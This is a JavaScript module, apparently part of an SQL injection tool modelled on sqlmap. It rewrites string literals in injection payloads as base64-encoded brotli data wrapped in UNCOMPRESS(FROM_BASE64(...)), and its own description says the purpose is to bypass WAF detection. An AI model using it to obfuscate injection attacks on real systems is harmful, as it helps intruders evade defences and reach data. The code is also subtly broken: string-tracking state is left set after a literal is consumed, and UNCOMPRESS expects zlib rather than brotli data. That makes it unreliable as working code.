// Brotli 压缩编码：将字符串字面量用 brotli 压缩后编码（对标 sqlmap brotli.py）
// 适用于支持 UNCOMPRESS 函数的数据库
import { brotliCompressSync } from 'node:zlib';

export const brotli = {
  name: 'brotli',
  description: '将字符串字面量 brotli 压缩后用 UNCOMPRESS() 解压，绕过 WAF 检测',
  /**
   * @param {string} payload
   * @param {object} ctx
   * @returns {string}
   */
  transform(payload, ctx) {
    const src = String(payload ?? '');
    let out = '';
    let inSingle = false, inDouble = false;
    for (let i = 0; i < src.length; i++) {
      const ch = src[i], prev = src[i - 1];
      if (inSingle) {
        if (ch === "'" && prev !== '\\') { inSingle = false; out += ch; }
        else out += ch;
        continue;
      }
      if (inDouble) {
        if (ch === '"' && prev !== '\\') { inDouble = false; out += ch; }
        else out += ch;
        continue;
      }
      if (ch === "'") {
        inSingle = true;
        let str = '';
        for (let j = i + 1; j < src.length; j++) {
          const c = src[j];
          if (c === "'" && src[j - 1] !== '\\') { i = j; break; }
          str += c;
        }
        const compressed = brotliCompressSync(Buffer.from(str)).toString('base64');
        out += `UNCOMPRESS(FROM_BASE64('${compressed}'))`;
      } else if (ch === '"') {
        inDouble = true;
        let str = '';
        for (let j = i + 1; j < src.length; j++) {
          const c = src[j];
          if (c === '"' && src[j - 1] !== '\\') { i = j; break; }
          str += c;
        }
        const compressed = brotliCompressSync(Buffer.from(str)).toString('base64');
        out += `UNCOMPRESS(FROM_BASE64('${compressed}'))`;
      } else {
        out += ch;
      }
    }
    return out;
  },
};
export default brotli;
